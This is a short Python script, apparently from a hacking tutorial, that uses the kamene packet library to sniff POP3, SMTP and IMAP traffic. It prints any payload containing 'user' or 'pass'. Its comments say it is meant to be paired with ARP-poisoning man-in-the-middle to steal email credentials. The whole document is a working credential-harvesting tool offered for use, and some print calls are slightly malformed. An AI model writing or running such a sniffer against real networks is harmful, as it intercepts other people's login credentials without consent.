# We are going to sniff SMTP,POP3 and IMAP credentials using Scappy
# We are going to couple this with ARP poison MITM to steal email credentials
# We can store all of it in a PCAP File

#110 POP3 , 25  SMTP, #143 IMAP

#skeleton sniffer
from kamene.all import *

def packetSniffer(packet):#We use kamene's internal packet representation
    if packet[TCP].payload: #accessing TCP part of the packet using Kamene index
        #TCP contains application level commands 
        mail_packet=bytes(packet[TCP].payload) 
        if b'user' in mail_packet.lower() or b'pass' in mail_packet.lower():#In POP and IMAP, commands are sent like USER <username>
            print("[*] Server : %s",packet[IP].dst) 
            print("[*] %s",mail_packet)
            print



sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packetSniffer,store=0)
#Using Berkeley Packet filter
#We pass function object which tells kamene to call that function each time on packet capture
#store=0 We don't want to store packets in memory, we just want to print them
        